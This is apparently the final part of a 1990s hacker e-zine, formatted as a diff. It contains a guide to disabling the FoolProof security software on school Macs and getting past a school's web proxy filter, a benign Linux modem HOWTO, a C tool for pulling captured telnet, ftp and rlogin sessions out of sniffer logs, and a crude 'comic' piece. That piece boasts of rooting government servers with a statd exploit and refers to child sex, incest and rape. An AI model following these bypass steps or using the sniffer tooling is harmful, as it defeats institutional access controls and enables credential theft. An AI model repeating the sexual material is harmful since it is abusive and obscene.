+      boot up the computer. The Extensions Manager will then appear and
+      you can then turn off the FoolProof Extension (You can also just
+      hold down the Shift key when you start up.  This will turn of the
+      Extensions.  This only works when the admin of the computer has set
+      up FoolProof so that it doesn't ask for a password to access the
+      hard drive so using the shift key doesn't usually work).
+   
+   2. Drag a folder (other than the Extensions Folder) onto the Launcher
+      and it will then make an alias in the Launcher Items folder.  You
+      can then drag the FoolProof extension onto the alias of the folder
+      on the Launcher.  This will move the FoolProof Extension into the
+      folder.  Restart the computer and the FoolProof Extension will no
+      longer be in the Extensions Folder and FoolProof will be disabled.
+      (This methood is also useful for moving files around the hard drive
+      when FoolProof disables dragging.)
+
+   3. Create a AppleScript program with a script like this:
+
+      tell application "Finder"
+
+          activate
+
+          choose file
+
+          copy the result to File1
+
+          choose folder
+
+          copy the result to Folder1
+
+          move File1 to Folder1
+
+      end tell
+
+      Run this script and choose the FoolProof Extension and then choose
+      a folder other than the Extensions folder. Restart the computer
+      and FoolProof should be disabled.
+
+   4. Run DropStuff and stuff the FoolProof Extension being sure to click
+      the "delete file after stuffing" check box.  Press OK and restart
+      the computer after it has finished stuffing.  The FoolProof Extension
+      will be compressed so it won't work (The original FoolProof
+      extension was deleted because you checked the "delete file after
+      stuffing" check box).
+
+   5. If the Get Info command is disabled and you want to unlock
+      something or change the memory allocation search for the file that
+      you want to change using the FindFile. You can get info on files in
+      window of FindFile. This is fairly useful for unlock the FoolProof
+      Control Panel, preference or the FoolProof Extension because they
+      lock every time you restart or open the FoolProof Control Panel.
+      You can also use this method to replace the FoolProof extension,
+      Control Panel or Preferences because you can't replace them if they
+      are locked (The older version of FoolProof allows you to move files
+      into the Trash and other folders using the FindFile).
+   
+   6. If you can run programs from a disk it is very simple to disable
+      FoolProof. Make a program that deletes the FoolProof extension or
+      you could use ResEdit to delete all the resources from the
+      FoolProof Extension and restart.
+
+   7. All of the settings for the FoolProof options are stored in the
+      FoolProof preferences. You can change the settings by switching the
+      preferences file with the one I have provided with this stack.
+      Unfortunatly, the password is already set to one that I don't know
+      but password protection is disabled. All the settings are disabled
+      when you install this preference file.
+
+   8. If you can't run programs of disks but you can use documents you
+      can create a Hypercard stack using hypercard externals that will
+      delete the FoolProof Extension. You can then run this stack using
+      Hypercard Player on the protected computer.
+
+------------------------
+
+One more stupid trick:  Another stupid trick the "FoolProof
+Administrators" like to do is to disable only certain menus of the
+applications.  Let me give you an example: after deciding that we cannot
+have students running wherever they please on the Internet, the
+administration bought membership to some gay-assed proxy server named Bess
+which restricts access to anything that could even remotely be considered
+fun (no, I'm not talking about porn, you sick0's).  Well, normally, we
+would start Netscape, go to Options Menu select Network Preferences (or
+Edit->Preferences in Communicator), and turn off the proxies and go about
+our business. FoolProof allowed admins to disable the options menu.  To
+bypass this idiocy, simply go to Netscape Mail, notice how a new window
+opens, containing all the menus including Options.  Many times admins
+forget to disable these menus (well, actually all the time ;).  So, that's
+another thing you might want to try.
+
+-------------------------
+
+What FoolProof makers say about their product:
+        "FoolProof Security, the most advanced version of the desktop
+        security licensed on over one million school computers, is the
+        market leader. FoolProof Security first began provide protection
+        of systems and hard drives in 1993. The current version provides
+        work groups with distinct privileges, including where users can
+        save documents, program access, including internet programs and
+        control of software downloaded from the internet."
+
+What I say about their product:
+        "haha"
+
+--------------------------
+
+Conclusion:  In conclusion, FoolProof is an expensive piece of software
+that's definitely not worth it.  It's a piece of crap, and very easily
+defeated.  If you are administrator planning to implement some security on
+Dos or Windows machines I recommend Fortress software.
+
+     (21)-----------MISC-----------------------------------------------(21)
+
+                      - { = - =  M  I  S  C  = - = } -
+
+  [56kpnp Linux]-------------------------------------------------| mosoka |
+
+        This Linux HOWTO examines the basic ways to setup your 56k
+compatible modem under the Linux operating system, how to get isapnptools
+to find and configure your modem correctly and also how to set other
+setting that are critical in your modem installation process.
+
+1: Introduction
+        
+        The aim of this document, basically as stated above is to get
+your 56k modem to work in Linux.  Modem installation under Linux in most
+cases aren't very complicated but its the new technology introduced with
+Windows 95 that has complicated matters.  Such modems like Winmodems and
+modems that get configured using the Plug and Play method are the problem.
+Linux, currently has no Plug and Play support but their are some ways to
+get around it and hopefully by the end of this document everything will be
+working normally if not better then before.
+
+2: Setting Up
+
+2.1: What Modem Do You Have
+
+        The first part of the solution is to become knowlegable with your
+modem and who makes its, model numbers, etc.  Some things that you should
+look out for are the following models: Winmodems and other modems that use
+Windows caching methods. If you have one of these models, stop reading
+this document and try and get your money back.  Winmodems, as of yet, are 
+uncompatible with Linux because of their methods of caching and setup.
+After you have found your model name and numbers you should take a visit
+to the homepage or bbs of your Linux distrubution company.  In my case, I
+use OpenLinux so I would visit www.caldera.com.  Most Linux companies have
+a list of compatible and uncompatible hardware for their distrubutions and 
+thats what your looking for.  The simplest method to finding this would 
+be to search the site for your modem model and if it comes up as a hit
+under compatible hardware, your in luck.  If by chance it come up in
+uncompatible hardware, you still may be able to get it working but
+it will take some time and a lot of work.  If you were unable to find a
+compatible/uncompatible hardware list its alright, it isn't really 
+important but you should still try and contact your Linux distrubution
+company by other means and try to find out if its compatible or not.
+
+2.2: Doing Some Research
+
+        The next part of setting up your modem is raid as many newsgroups
+and support archives you can to get a backround on your modem.  You will
+be surprised at how many people are in the same situation as yourself.
+When I was tring to figure out how to configure my modem, I met some guy
+who was in the same situation and did try to offer some help but it didn't
+work probably due to the differences in our operating systems.  A good
+place to check for your modem model is to go to www.metacrawler.com and
+search throughout the newsgroups selection for your modem model. If you
+don't get that many hits searching the newsgroups you can all try "Linux
+and <your modem model here>" in the web search option.  If your modem is
+not Plug and Play, skip down to Configuring Your Modem In Linux.
+
+2.3: Downloading Files
+
+        Alright, now that you know your modem you should be able to
+determine weather or not is Plug And Play or not.  Now a days, most
+internal modems are Plug and Play and you will need to download a program
+called isapnptools in order to configure them.  Isapnptools is the leading
+and currently the only Plug and Play configuration tool for the Linux
+operating system.  It can be found at www.roestock.demon.co.uk/isapnptools.
+At the time of this document, the latest version 1.13 and is available in
+many formats from tar gzip to rpm.  Basically, thats the only file you will
+need.
+
+2..4: Configuring Isapnptools
+
+        Isapnptools comes with a tool called pnpdump which will scan your
+system for your Plug and Play device and find all the different ways it
+can be configured.  Now is a good time to get out some paper and copy down
+some configurations cause you will need to write a config file next.  From
+the information from pnpdump, you now must make a file called isapnp.conf.
+Basically, the stuff that you saw on your screen when your ran pnpdump and
+copied down on paper you will just need to put it in this file, so pick
+the best setup for your system that doesn't conflict with any other
+devices and start typing in your isapnp.conf file.  For an example, here
+is my isapnp.conf file so you can see what i'm talking about:
+
+(READPORT 0x3bb)
+(ISOLATE)
+(IDENTIFY *)
+(CONFIGURE MOT1550/90238999 (LD 0
+(IO 0 (BASE 0x3e8))
+(INT 0 (IRQ 7 (MODE +E)))
+(ACT Y)))
+(WAITFORKEY)
+
+        If your having trouble and don't understand you can formulate a
+config file from my example.  First you can copy and paste the first 3
+lines and put them into your file.  This will make a list of the Plug and
+Play devices you have installed.  At this point, save your isapnp.conf
+file and run it.  It will tell you the device name and serial numbers of
+the devices when you load up isapnp with your isapnp.conf file.  Copy the
+device name and serial number off your screen and paste them into your
+isapnp.conf file in this format:
+
+(CONFIGURE <devicename/serialnumber> (LD 0
+
+In the next line, you need to decide what port you want to put your modem
+in. You should pick a port that obviously doesn't have anything in it or
+is configured in your Linux.  In my example, I'm using port com 3 which in
+hex is 0x3e8. If you want to use a different port, just change the hex
+address after the command "BASE".  Lastly, you need to configure what irq
+your modem will use. In my example, I'm using irq 7.  If you want to use a
+different one, like with the port address, just change the number after the
+command "IRQ". The last two lines of the config file are manditory and you
+should just copy and paste them in.  Next, you need setup a program called
+setserial. To do this you should make a file called "modem" in your
+isapnptools directory and have it consist of the following:
+
+isapnp isapnp.conf
+setserial /dev/ttyS<com # - 1) irq <irq of your modem here> autoconfig
+setserial /dev/ttyS<com # - 1) spd_vhi
+setserial /dev/ttyS<com # - 1) 
+stty -echo < /dev/ttyS<com # - 1)
+
+        Note that the field <com # - 1> means that you should take the com 
+port number where your modem is in and subtract one from it. For example,
+my modem is com 3 so I would use: "/dev/ttyS2". Save your "modem" file and
+make it executable by typing in: "chmod +x modem" and lastly, run it.  Now
+that  your Plug and Play device is configured, you need to configure Linux
+to the settings you just set to your modem.
+
+2.5: Configuring Your Modem In Linux
+
+        If you modem Plug and Play, you already set it up to a com port
+and irq address but if its not, you need to open your computer up and set
+it up using dip switches or jumpers but if you already set them for
+Windows then you don't need to reset them. Next thing you need to do if
+your modem is Plug and Play or not, is go to your Linux setup program. For
+example, the Linux setup program in OpenLinux is Lisa and in Slackware,
+it's setup. In the setup program, configure Linux to the settings you set
+using isapnptools or the settings you set using your jumpers or dip
+switches.
+
+3: Finished At Last
+
+3.1: Thats It, Your Done
+
+        Alright, Congratulations.  You have now setup your modem in Linux.
+To use it, just use the device name of /dev/tty<com # - 1> in
+communication programs like minicom or in ppp dialing scripts. I hope this
+faq was able to answer all your questions you had about setting up your
+56k modem in Linux and reached the goal of getting it to work.
+
+     (22)-----------MISC-----------------------------------------------(22)
+
+  [Sniff Log]-----------------------------------------------------| chrak |
+
+/*
+          sniffer log searcher, for quickly checking a sniffer log to see
+          if there's any new entries in it, by chrak
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <strings.h>
+
+void main(int argc, char **argv)
+   {
+   int i, type = 0 , o = 0; /*type -t 1,-f 2,-tf 3,-r 4,-tr 5,-rf 6,-trf 7*/
+   char c[80], ignore[30];
+   FILE *fp1, *fp2;
+
+   if(argc == 1) 
+      {
+      printf("%s -l log -tfr -o out\n-l solsniffer log to open\n"
+             "-t get telnets\n-f get ftps\n-r get rlogins\n-o out file"
+             " - else stdout\n-i ignore string - ignores output with"
+             " given string\n", argv[0]); 
+      exit(EXIT_FAILURE); 
+      }
+   while((i = getopt(argc, argv, "l:o:i:tfr")) != -1)
+      {
+      switch(i)
+         {
+         case 'l' : printf("input: %s\n", optarg);
+                    if((fp1 = fopen(optarg, "r")) == NULL)
+                       {
+                       printf("Cant open file %s\n",optarg);
+                       exit(EXIT_FAILURE);
+                       }
+                    break;
+         case 'o' : printf("output: %s\n", optarg); 
+                    fp2 = fopen(optarg, "a");
+                    o = 1;
+                    break;
+         case 't' : printf("telnet\n");
+                    type = 1+type; 
+                    break;
+         case 'f' : printf("ftp\n");
+                    type = 2+type;
+                    break;
+         case 'r' : printf("rlogin\n");
+                    type = 4+type; 
+                    break;
+         case 'i' : printf("ignore: %s\n", optarg);
+                    strcpy(ignore, optarg);
+                    break;
+         }
+      }
+   for(;;)
+      {
+      if((fgets(c, 80, fp1) == NULL)) break; 
+
+      if(strstr(c, ignore) == NULL)
+         {
+         if(type == 1 || type == 3 || type == 5 || type == 7)
+            if(strstr(c,"(telnet)") != NULL)
+               {   
+               if(o==1) fprintf(fp2, "%s", c);
+                  else printf("%s", c);
+               }
+         if(type == 2 || type == 3 || type == 6 || type == 7)
+            if(strstr(c,"(ftp)") != NULL)
+               {
+               if(o==1) fprintf(fp2, "%s", c);
+                  else printf("%s", c);
+               }
+         if(type == 4 || type == 5 || type == 6 || type == 7)
+            if(strstr(c,"(rlogin)") != NULL)
+               {
+               if(o==1) fprintf(fp2, "%s", c);
+                  else printf("%s", c);
+               }
+         }
+      }   
+   fclose(fp1);
+   if(o==1) fclose(fp2);
+   }
+
+     (23)-----------COMIC RELIEF---------------------------------------(23)
+
+               - { = - =  C O M I C   R E L I E F   = - = } -
+
+                        With guest editor, Analyzer
+
+  [Young Hackers, and Jail]------------------------------------| Ana1yzer |
+
+          Greetings from the fighting grounds of Israel.
+          I am your guest editor for this month.  Let me 
+          start off by introducing myself to those of you
+          who have failed to notice my L33tness.  I am Analyzer,
+          and was born in Mymomsucksyouall israel.  My nickname 
+          comes from many generations of seksi anal seks0rs. 
+          My mother died when I was 14 from an anal concussion
+          I never thought that my little prick would end up 
+          killing her.  Anyway after her death I was in shock
+          so I started hanging on the net alot.  And
+          having sibor seks on irc in #young_child_sex where I
+          felt welcome.  Just when things were going ok, my goat 
+          humpry was bombed by the Israel military.  I lubbed 
+          humpfry he was my only friend in the whole wide world
+          after his death I took my anger out on the government
+          not for killing a friend, but for killing a lover. 
+          Well enough about my gay, and boring life.  This all
+          started when me, and a couple of friends got together 
+          to hax0r the goberment cause they wer fuckin un elite 
+          and shit and they killed humpfry so I was pissed you know?  
+          Ok so me Juan Carlos, and Don Mexicano got together a family
+          of over 100 immirgrants, and rented out a warehouse for
+          our elite operation.  Once things were set, and we taught
+          the immirgrants our elite ways we started hacking away. 
+          The method I used is very complex and hard.
+
+          Here it is: ./statd url.gov   Holy shit?!! you say?!?  You'll
+          never get it you say?!?   Well don't worry it took me months
+          to figure it out and im fucken mad elite and shit
+
+          Really it's nothing special we just sat there feeding
+          gobernment url's to a list and then we gained root.
+          I guess the gobernment is pretty fucken dumb because
+          it took them 2 months to figure out how to use
+          the tekniq 2 more days than it took me.  Our attack
+          was called the most systematic attack eber (th4tz c4us3
+          w3 c4n typ3 a1l el8, 4n FuNky) and because "statd"
+          is what you call "anonymous"...
+
+          Jail is really a bad bad thing I neber would eber go again.
+          My first bad experience in jail was with what you Americans
+          call "soap."  One day I was rubbin and scrubbin, and OOPSIE!
+          The soap dropped so I bent down to pick it up, and for no
+          reason my ass started moving back and forth and my hips side
+          to side.  I thought to myself "hrmmm," and kept looking for the
+          soap the feeling really didn't bug me at all I kinda liked it.
+          Once I found the soap I stood, and heard a suction type sound
+          coming from my ass it was funny, but my asshole wasn't hurting
+          anymore so it really didn't bug me.  Then all of a sudden I was
+          approached from behind.  I guess in American network security
+          you would call what happens next an "outside attack."  I was
+          forced to the ground, and then anal seks0red...
+
+          After my shower I was assigned a cell block with my new
+          cellmate Bubba.  It was there where I was forced to perform oral
+          sex "again."  My dad had already taught me this method you
+          Americans call "giving head."  In fact, I still have my dads
+          teef marks on the tip of my pee pee, every day I look at it to
+          remember the good times dad, and I had (those were the days).
+
+          The morale of this story is that well if you go to jail you get
+          screwed look.  The extreme close ups of my anus below:
+
+          ANAL SHOTS:
+
+            (_|_)             (_o_)
+ 
+          BEFORE JAIL       AFTER JAIL
+
+=============================================================================
+|| Download Legions Text Files, and Zines at the following Boards:         ||
+=============================================================================
+|| Under The Influence...........(ALM)OST-HERE.............World HQ....... ||
+|| Narkotik Illusions............(303)PRI-VATE.............Midwestern HQ.. ||
+|| Exodus BBS....................(707)935-6867.............Distro Site.... ||
+|| Electric Rush (NuP)...........(707)257-7208.............Distro Site.... ||
+=============================================================================
+|| Leave comments, death threats, and ideas to webmaster@legions.org       ||
+=============================================================================
+|| Knowing what you cannot do is more important than knowing what you can. ||
+=============================================================================
